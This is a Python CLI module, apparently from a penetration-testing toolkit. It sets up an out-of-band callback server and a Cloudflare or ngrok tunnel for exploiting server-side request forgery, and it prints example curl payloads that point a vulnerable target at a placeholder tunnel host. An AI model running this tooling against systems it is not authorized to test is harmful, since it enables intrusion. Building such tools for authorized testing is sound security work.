"""`hot ssrf ...` - SSRF exploitation helpers."""
import socketserver
import subprocess
import threading
import time

import click
from rich.console import Console


@click.group("ssrf")
def ssrf():
    """SSRF exploitation helpers."""


@ssrf.command("oob")
@click.option("--tunnel", type=click.Choice(["cloudflare", "ngrok"]), default="cloudflare",
              help="Tunnel type")
@click.option("--port", default=8080, show_default=True, type=int, help="Local callback port")
@click.option("--target", help="Target URL with SSRF vulnerability")
def ssrf_oob(tunnel, port, target):
    """Start OOB callback server for SSRF exploitation with tunnel."""
    console = Console()
    console.print("[bold green]SSRF OOB Exploitation Setup[/bold green]")
    console.print(f"Tunnel: {tunnel}, Port: {port}")

    if target:
        console.print(f"Target: {target}")
        console.print("[yellow]Example payload:[/yellow]")
        if tunnel == "cloudflare":
            console.print(f"  curl -H 'Host: YOUR_TUNNEL_URL' {target}")
        else:
            console.print(f"  curl {target}?url=http://YOUR_TUNNEL_URL")

    def start_server():
        from workers.ssrf_utils.ssrf_callback_server import SSRFHandler
        with socketserver.TCPServer(("0.0.0.0", port), SSRFHandler) as httpd:
            console.print(f"[green]Callback server listening on port {port}[/green]")
            httpd.serve_forever()

    threading.Thread(target=start_server, daemon=True).start()
    time.sleep(1)

    console.print(f"[bold blue]Starting {tunnel} tunnel...[/bold blue]")
    try:
        if tunnel == "cloudflare":
            console.print("[dim]Tunnel URL appears below (look for https://*.trycloudflare.com)[/dim]")
            subprocess.run(["cloudflared", "tunnel", "--url", f"http://localhost:{port}"])
        else:
            console.print("[dim]Check http://localhost:4040 for your tunnel URL[/dim]")
            subprocess.run(["ngrok", "http", str(port)])
    except FileNotFoundError:
        console.print(f"[red]Error: {tunnel} not found. Install it first.[/red]")
